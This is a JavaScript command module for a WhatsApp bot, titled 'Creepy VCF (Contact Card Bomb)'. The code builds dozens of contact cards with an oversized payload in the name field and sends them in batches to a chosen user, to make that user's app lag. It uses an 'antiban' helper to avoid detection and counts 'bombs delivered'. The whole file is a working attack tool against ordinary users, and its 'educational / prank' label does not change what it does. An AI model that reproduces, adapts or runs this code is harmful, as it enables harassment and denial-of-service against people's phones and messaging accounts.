/**
 * 🐛 Tech God Bug 2026 — Creepy VCF (Contact Card Bomb)
 * Sends a massive vCard with CREEPY payload embedded in name fields,
 * causing rendering lag when WhatsApp tries to display the contact.
 * ⚠️ EDUCATIONAL / PRANK USE ONLY
 * By Dev-Ntando (payload source: CREEPY_MD-V1)
 */
'use strict';

const config  = require('../../config');
const antiban = require('../../utils/antiban');
const db      = require('../../database');

const { creepyd11 } = require('./creepy-data/creepyd11');

function generateCreepyVcf(count = 50) {
  // Use creepy payload as the display name
  const name = typeof creepyd11 === 'function' ? creepyd11(config.prefix) : creepyd11;
  const shortPayload = name.substring(0, 5000); // Truncate for VCF field

  let vcards = [];
  for (let i = 0; i < count; i++) {
    vcards.push(
      `BEGIN:VCARD\n` +
      `VERSION:3.0\n` +
      `FN:${shortPayload}\n` +
      `TEL;type=CELL:+000000000${i}\n` +
      `END:VCARD`
    );
  }
  return vcards;
}

module.exports = async (sock, msg, args, { isOwner, sender, jid }) => {
  if (!config.bugsEnabled.crash) {
    return antiban.sendHuman(sock, jid, { text: '❌ Crash bugs are currently disabled.' }, { quoted: msg });
  }

  const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
  let target = mentioned[0] || (args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null);

  if (!target) {
    return antiban.sendHuman(sock, jid, {
      text: `🐛 *Creepy VCF*\n\n*Usage:* ${config.prefix}creepyvcf @user [count]\n*Example:* ${config.prefix}creepyvcf @someone 30\n\n_Sends contact cards with CREEPY payloads embedded in names._\n_Causes extreme lag when WhatsApp tries to render them._`,
    }, { quoted: msg });
  }

  const count = Math.min(parseInt(args[1]) || 30, 100);

  await antiban.sendHuman(sock, jid, {
    text: `🐛 *Sending CREEPY VCF bomb...*\n🎯 Target: @${target.split('@')[0]}\n💣 Contacts: ${count}\n⚡ Payload: Unicode Name Cards`,
    mentions: [target]
  }, { quoted: msg });

  const vcards = generateCreepyVcf(count);

  // Send in batches of 5
  for (let i = 0; i < vcards.length; i += 5) {
    const batch = vcards.slice(i, i + 5);
    for (const vcard of batch) {
      try {
        await sock.sendMessage(target, {
          contacts: {
            displayName: '🐛',
            contacts: [{ vcard }]
          }
        });
      } catch (e) { /* skip */ }
    }
    await new Promise(r => setTimeout(r, 600));
  }

  db.incrementStat('totalBugs');
  db.incrementUserStat(sender, 'bugs');

  await antiban.sendHuman(sock, jid, {
    text: `✅ *Creepy VCF sent!*\n🐛 ${count} contact bombs delivered to @${target.split('@')[0]}`,
    mentions: [target]
  }, { quoted: msg });
};
